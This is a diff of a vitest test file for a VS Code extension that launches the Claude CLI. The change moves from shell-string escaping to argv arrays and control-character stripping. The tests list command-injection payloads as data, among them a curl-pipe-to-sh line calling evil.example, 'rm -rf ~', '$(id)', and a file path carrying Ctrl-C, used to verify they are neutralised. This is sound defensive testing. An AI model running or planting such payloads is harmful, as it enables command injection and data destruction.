@@ -1,44 +1,32 @@
 import { describe, it, expect } from 'vitest';
 import {
-  buildClaudeCommand,
-  escapeForDoubleQuotes,
+  buildClaudeArgs,
   PromptContext,
   PROMPT_TEMPLATES,
+  stripControlChars,
 } from '../../commands/context-menu-utils';
 import { PermissionMode } from '../../types';
 
-describe('escapeForDoubleQuotes', () => {
-  it('escapes backslashes', () => {
-    expect(escapeForDoubleQuotes('path\\to\\file')).toBe('path\\\\to\\\\file');
+describe('stripControlChars', () => {
+  it('removes Ctrl-C and other C0 controls that could cancel a typed shell line', () => {
+    expect(stripControlChars('a\x03touch /tmp/x\x04\x15b')).toBe('atouch /tmp/xb');
   });
 
-  it('escapes double quotes', () => {
-    expect(escapeForDoubleQuotes('say "hello"')).toBe('say \\"hello\\"');
+  it('removes ESC so terminal escape sequences cannot reach the displayed prompt', () => {
+    expect(stripControlChars('x\x1b[2Jy')).toBe('x[2Jy');
   });
 
-  it('escapes dollar signs', () => {
-    expect(escapeForDoubleQuotes('cost is $5')).toBe('cost is \\$5');
+  it('removes carriage returns, DEL, and C1 controls', () => {
+    expect(stripControlChars('a\rb\x7fc\x9bd')).toBe('abcd');
   });
 
-  it('escapes backticks', () => {
-    expect(escapeForDoubleQuotes('run `cmd`')).toBe('run \\`cmd\\`');
+  it('removes Unicode bidi overrides and isolates', () => {
+    expect(stripControlChars('a\u202Eb\u2066c\u2069d')).toBe('abcd');
   });
 
-  it('returns empty string unchanged', () => {
-    expect(escapeForDoubleQuotes('')).toBe('');
-  });
-
-  it('leaves safe characters unchanged', () => {
-    expect(escapeForDoubleQuotes("hello world it's fine")).toBe("hello world it's fine");
-  });
-
-  it('escapes exclamation marks (bash history expansion)', () => {
-    expect(escapeForDoubleQuotes('fix this!')).toBe('fix this\\!');
-    expect(escapeForDoubleQuotes('!!')).toBe('\\!\\!');
-  });
-
-  it('escapes all special characters combined', () => {
-    expect(escapeForDoubleQuotes('a\\b"c$d`e!f')).toBe('a\\\\b\\"c\\$d\\`e\\!f');
+  it('keeps newlines, tabs, and shell metacharacters (they are inert in argv)', () => {
+    const text = 'line1\n\tline2 "q" $HOME `id` $(id) ! ^old^new^ \\';
+    expect(stripControlChars(text)).toBe(text);
   });
 });
 
@@ -147,58 +135,61 @@ describe('PROMPT_TEMPLATES', () => {
   });
 });
 
-describe('buildClaudeCommand', () => {
-  it('emits no flag for the default mode', () => {
-    expect(buildClaudeCommand('Explain this', 'default')).toBe('claude "Explain this"');
+describe('buildClaudeArgs', () => {
+  it('passes the prompt as a single argument after --', () => {
+    expect(buildClaudeArgs('Explain this', 'default')).toEqual(['--', 'Explain this']);
   });
 
   it('emits the acceptEdits flag', () => {
-    expect(buildClaudeCommand('Explain this', 'acceptEdits')).toBe(
-      'claude --permission-mode acceptEdits "Explain this"',
-    );
+    expect(buildClaudeArgs('Explain this', 'acceptEdits')).toEqual([
+      '--permission-mode',
+      'acceptEdits',
+      '--',
+      'Explain this',
+    ]);
   });
 
   it('emits the bypassPermissions flag', () => {
-    expect(buildClaudeCommand('Explain this', 'bypassPermissions')).toBe(
-      'claude --dangerously-skip-permissions "Explain this"',
-    );
+    expect(buildClaudeArgs('Explain this', 'bypassPermissions')).toEqual([
+      '--dangerously-skip-permissions',
+      '--',
+      'Explain this',
+    ]);
   });
 
-  // VS Code does not enforce a setting's declared `enum` at read time, so a repository's
-  // .vscode/settings.json can put an arbitrary string in contextMenu.permissionMode. That
-  // string must never reach the shell command line.
-  describe('rejects out-of-union values instead of interpolating them', () => {
-    const payloads = [
-      '; touch /tmp/pwned; #',
-      '&& curl -s https://evil.example/x | sh',
-      '$(id)',
-      '`id`',
-      '| tee /tmp/leak',
-      'acceptEdits; rm -rf ~',
-      '\n echo injected',
-      '',
-    ];
+  // VS Code does not enforce a setting's declared `enum` at read time, so a hand-edited
+  // settings.json can put an arbitrary string in contextMenu.permissionMode. That string
+  // must never reach the command line.
+  describe('rejects out-of-union permission modes instead of passing them through', () => {
+    const payloads = ['; touch /tmp/pwned; #', '$(id)', 'acceptEdits; rm -rf ~', '--help', ''];
 
     for (const payload of payloads) {
       it(`neutralises ${JSON.stringify(payload)}`, () => {
-        const cmd = buildClaudeCommand('Explain this', payload as PermissionMode);
-        expect(cmd).toBe('claude "Explain this"');
-        expect(cmd).not.toContain(payload.trim() || '\u0000');
+        expect(buildClaudeArgs('Explain this', payload as PermissionMode)).toEqual([
+          '--',
+          'Explain this',
+        ]);
       });
     }
   });
 
-  it('never emits a flag string outside the fixed set', () => {
-    const allowed = ['', ' --permission-mode acceptEdits', ' --dangerously-skip-permissions'];
-    for (const mode of ['default', 'acceptEdits', 'bypassPermissions', 'nonsense', '; id']) {
-      const cmd = buildClaudeCommand('P', mode as PermissionMode);
-      const flag = cmd.slice('claude'.length, cmd.length - ' "P"'.length);
-      expect(allowed).toContain(flag);
-    }
+  it('keeps shell metacharacters, newlines, and a leading dash inside the one prompt argument', () => {
+    const prompt = '-rf "quoted" $HOME `id` $(touch /tmp/x)\nsecond line';
+    const args = buildClaudeArgs(prompt, 'default');
+    expect(args).toEqual(['--', prompt]);
   });
 
-  it('leaves the escaped prompt intact', () => {
-    const prompt = escapeForDoubleQuotes('cost is $5 and `cmd`');
-    expect(buildClaudeCommand(prompt, 'default')).toBe('claude "cost is \\$5 and \\`cmd\\`"');
+  it('keeps a crafted file path inside the prompt argument', () => {
+    const ctx: PromptContext = {
+      selectedText: '',
+      filePath: stripControlChars('/repo/a\x03touch /tmp/canary\n.txt'),
+      startLine: 1,
+      endLine: 2,
+      unsaved: false,
+    };
+    const args = buildClaudeArgs(PROMPT_TEMPLATES.explain(ctx), 'default');
+    expect(args).toHaveLength(2);
+    expect(args[1]).toContain('`/repo/atouch /tmp/canary\n.txt`');
+    expect(args[1]).not.toContain('\x03');
   });
 });
